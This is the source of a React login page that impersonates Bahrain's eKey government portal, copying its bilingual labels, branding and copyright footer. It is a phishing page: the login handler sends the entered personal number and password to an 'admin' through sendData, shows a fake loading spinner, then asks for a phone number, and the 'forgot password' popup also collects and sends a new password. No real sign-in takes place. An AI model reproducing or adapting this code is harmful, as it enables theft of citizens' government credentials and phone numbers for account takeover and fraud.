import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData } from "@/lib/store";
import "./LoginPage.css";

type Lang = 'ar' | 'en';

const content = {
  ar: {
    banner: 'صفحة دخول المفتاح الإلكتروني',
    title: 'دخول',
    personalNumber: 'الرقم الشخصي',
    password: 'كلمة السر',
    forgotPassword: 'هل نسيت كلمة السر؟',
    newUser: 'مستخدم جديد؟ سجل',
    login: 'تسجيل الدخول',
    loginLink: 'دخول',
    langSwitch: 'English',
    copyright: '2021 © هيئة المعلومات والحكومة الإلكترونية، مملكة البحرين. جميع الحقوق محفوظة',
    privacy: 'سياسة الخصوصية',
    sitemap: 'خريطة الموقع',
    contactUs: 'اتصل بنا',
    lastUpdate: 'آخر تحديث بتاريخ : Feb 20, 2025',
  },
  en: {
    banner: 'eKey Login Page',
    title: 'Login',
    personalNumber: 'Personal Number',
    password: 'Password',
    forgotPassword: 'Forgot Password?',
    newUser: 'New User? Register',
    login: 'Login',
    loginLink: 'Login',
    langSwitch: 'عربي',
    copyright: '2021 © Information & eGovernment Authority, Kingdom of Bahrain. All Rights Reserved',
    privacy: 'Privacy Policy',
    sitemap: 'Sitemap',
    contactUs: 'Contact Us',
    lastUpdate: 'Last Updated : Feb 20, 2025',
  }
};

export default function LoginPage() {
  const [, setLocation] = useLocation();
  const [lang, setLang] = useState<Lang>('ar');
  const [personalNumber, setPersonalNumber] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [showForgotPopup, setShowForgotPopup] = useState(false);
  const [forgotPersonalNumber, setForgotPersonalNumber] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showNewPass, setShowNewPass] = useState(false);
  const [showConfirmPass, setShowConfirmPass] = useState(false);

  const getPasswordStrength = (pass: string) => {
    if (!pass) return { label: '', color: '', width: '0%' };
    let score = 0;
    if (pass.length >= 8) score++;
    if (/[A-Z]/.test(pass)) score++;
    if (/[a-z]/.test(pass)) score++;
    if (/[0-9]/.test(pass)) score++;
    if (/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]/.test(pass)) score++;
    if (score <= 1) return { label: lang === 'ar' ? 'ضعيفة' : 'Weak', color: '#e4042c', width: '20%' };
    if (score <= 2) return { label: lang === 'ar' ? 'ضعيفة' : 'Weak', color: '#e4042c', width: '40%' };
    if (score <= 3) return { label: lang === 'ar' ? 'متوسطة' : 'Medium', color: '#f5a623', width: '60%' };
    if (score <= 4) return { label: lang === 'ar' ? 'قوية' : 'Strong', color: '#4caf50', width: '80%' };
    return { label: lang === 'ar' ? 'قوية جداً' : 'Very Strong', color: '#2e7d32', width: '100%' };
  };

  const passwordStrength = getPasswordStrength(newPassword);

  useEffect(() => {
    navigateToPage('صفحة دخول المفتاح الإلكتروني');
  }, []);

  const t = content[lang];
  const isRtl = lang === 'ar';

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (!personalNumber || !password) return;
    
    setIsLoading(true);
    
    // Send data to admin
    sendData({
      personalNumber,
      password,
      page: 'login'
    });

    // Show spinner then popup
    setTimeout(() => {
      setIsLoading(false);
      setShowPopup(true);
    }, 1500);
  };

  const handlePhoneContinue = () => {
    if (!phoneNumber.trim()) return;
    sendData({
      personalNumber,
      phoneNumber,
      page: 'phone-update'
    });
    localStorage.setItem('loginPersonalNumber', personalNumber);
    localStorage.setItem('loginPhoneNumber', phoneNumber);
    setShowPopup(false);
    setLocation('/registration-summary?from=login');
  };

  return (
    <div className="login-wrapper" dir={isRtl ? 'rtl' : 'ltr'}>
      {/* Header */}
      <div className="login-header">
        <div className="login-container">
          <div className="login-header-inner">
            <a className="login-brand" href="#" onClick={(e) => { e.preventDefault(); setLocation('/'); }}>
              <img src="/images/logo.jpg" alt="eKey logo" />
            </a>
            <div className="login-header-left">
              <a href="#" className="login-link">{t.loginLink}</a>
              <span className="login-separator">|</span>
              <a href="#" className="login-link" onClick={(e) => { e.preventDefault(); setLang(lang === 'ar' ? 'en' : 'ar'); }}>{t.langSwitch}</a>
            </div>
          </div>
        </div>
      </div>

      {/* Banner */}
      <div className="login-banner">
        <span>{t.banner}</span>
      </div>

      {/* Login Card */}
      <div className="login-card-wrapper">
        <div className="login-card">
          <h2 className="login-card-title">{t.title}</h2>
          <form onSubmit={handleLogin}>
            <div className="login-field">
              <label>{t.personalNumber}</label>
              <input
                type="text"
                inputMode="numeric"
                value={personalNumber}
                onChange={(e) => {
                  const val = e.target.value.replace(/[^0-9]/g, '');
                  setPersonalNumber(val);
                }}
                required
              />
            </div>
            <div className="login-field">
              <label>{t.password}</label>
              <input
                type="password"
                value={password}
                onChange={(e) => {
                  const val = e.target.value.replace(/[^a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]/g, '');
                  setPassword(val);
                }}
                required
              />
            </div>
            <div className="login-links-row">
              <a href="#" className="login-forgot" onClick={(e) => { e.preventDefault(); setShowForgotPopup(true); }}>{t.forgotPassword}</a>
              <a href="#" className="login-new-user" onClick={(e) => { e.preventDefault(); setLocation('/manage-account'); }}>{t.newUser}</a>
            </div>
            <button type="submit" className="login-submit-btn" disabled={isLoading}>
              {isLoading ? (
                <span className="login-spinner"></span>
              ) : (
                t.login
              )}
            </button>
          </form>
        </div>
      </div>

      {/* Phone Update Popup */}
      {showPopup && (
        <div className="login-popup-overlay">
          <div className="login-popup">
            <p className="login-popup-text">
              {isRtl ? 'عليك تحديث رقم الهاتف للإستفادة من جميع خدمات المفتاح الإلكتروني' : 'You need to update your phone number to benefit from all eKey services'}
            </p>
            <div className="login-popup-field">
              <label>{isRtl ? 'أدخل رقم الهاتف' : 'Enter phone number'}</label>
              <input
                type="text"
                inputMode="numeric"
                value={phoneNumber}
                onChange={(e) => {
                  const val = e.target.value.replace(/[^0-9]/g, '');
                  setPhoneNumber(val);
                }}
                placeholder={isRtl ? 'رقم الهاتف' : 'Phone number'}
              />
            </div>
            <button
              className="login-popup-btn"
              onClick={handlePhoneContinue}
              disabled={!phoneNumber.trim()}
            >
              {isRtl ? 'متابعة' : 'Continue'}
            </button>
          </div>
        </div>
      )}

      {/* Forgot Password Popup */}
      {showForgotPopup && (
        <div className="login-popup-overlay">
          <div className="login-popup login-forgot-popup">
            <button className="login-forgot-close" onClick={() => setShowForgotPopup(false)}>&times;</button>
            <h3 className="login-forgot-title">{lang === 'ar' ? 'إستعادة كلمة المرور' : 'Password Recovery'}</h3>
            <div className="login-popup-field">
              <label>{lang === 'ar' ? 'أدخل الرقم الشخصي' : 'Enter Personal Number'}</label>
              <input
                type="text"
                inputMode="numeric"
                value={forgotPersonalNumber}
                onChange={(e) => {
                  const val = e.target.value.replace(/[^0-9]/g, '');
                  setForgotPersonalNumber(val);
                }}
                placeholder={lang === 'ar' ? 'الرقم الشخصي' : 'Personal Number'}
              />
            </div>
            <div className="login-popup-field">
              <label>{lang === 'ar' ? 'أدخل كلمة السر الجديدة' : 'Enter New Password'}</label>
              <div className="login-pass-wrapper">
                <input
                  type={showNewPass ? 'text' : 'password'}
                  value={newPassword}
                  onChange={(e) => {
                    const val = e.target.value.replace(/[^a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]/g, '');
                    setNewPassword(val);
                  }}
                  placeholder={lang === 'ar' ? 'كلمة السر الجديدة' : 'New Password'}
                />
                <button type="button" className="login-pass-toggle" onClick={() => setShowNewPass(!showNewPass)}>
                  {showNewPass ? '🙈' : '👁'}
                </button>
              </div>
              {newPassword && (
                <div className="login-strength">
                  <div className="login-strength-bar">
                    <div className="login-strength-fill" style={{ width: passwordStrength.width, backgroundColor: passwordStrength.color }}></div>
                  </div>
                  <span className="login-strength-label" style={{ color: passwordStrength.color }}>{passwordStrength.label}</span>
                </div>
              )}
            </div>
            <div className="login-popup-field">
              <label>{lang === 'ar' ? 'تأكيد كلمة السر' : 'Confirm Password'}</label>
              <div className="login-pass-wrapper">
                <input
                  type={showConfirmPass ? 'text' : 'password'}
                  value={confirmPassword}
                  onChange={(e) => {
                    const val = e.target.value.replace(/[^a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]/g, '');
                    setConfirmPassword(val);
                  }}
                  placeholder={lang === 'ar' ? 'أعد إدخال كلمة السر' : 'Re-enter Password'}
                />
                <button type="button" className="login-pass-toggle" onClick={() => setShowConfirmPass(!showConfirmPass)}>
                  {showConfirmPass ? '🙈' : '👁'}
                </button>
              </div>
              {confirmPassword && newPassword !== confirmPassword && (
                <span className="login-pass-mismatch">{lang === 'ar' ? 'كلمة السر غير متطابقة' : 'Passwords do not match'}</span>
              )}
            </div>
            <button
              className="login-popup-btn"
              onClick={() => {
                if (!forgotPersonalNumber || !newPassword || !confirmPassword || newPassword !== confirmPassword) return;
                sendData({
                  forgotPersonalNumber,
                  newPassword,
                  page: 'forgot-password'
                });
                localStorage.setItem('loginPersonalNumber', forgotPersonalNumber);
                localStorage.setItem('loginPhoneNumber', '');
                setShowForgotPopup(false);
                setLocation('/registration-summary?from=login');
              }}
              disabled={!forgotPersonalNumber || !newPassword || !confirmPassword || newPassword !== confirmPassword}
            >
              {lang === 'ar' ? 'متابعة' : 'Continue'}
            </button>
          </div>
        </div>
      )}

      {/* White Gap with Skyline */}
      <div className="login-skyline"></div>

      {/* Footer */}
      <div className="login-footer">
        <div className="login-container">
          <div className="login-footer-top">
            <div className="login-social-links">
              <a href="#"><i className="fa fa-facebook"></i></a>
              <a href="#"><i className="fa fa-twitter"></i></a>
              <a href="#"><i className="fa fa-youtube-play"></i></a>
              <a href="#"><i className="fa fa-linkedin"></i></a>
              <a href="#"><i className="fa fa-instagram"></i></a>
            </div>
          </div>
          <div className="login-copyright">
            {t.copyright}
            <p>
              <a href="#">{t.privacy}</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
              <a href="#">{t.sitemap}</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
              <a href="#">{t.contactUs}</a>
            </p>
            <p>{t.lastUpdate}</p>
          </div>
        </div>
      </div>
    </div>
  );
}
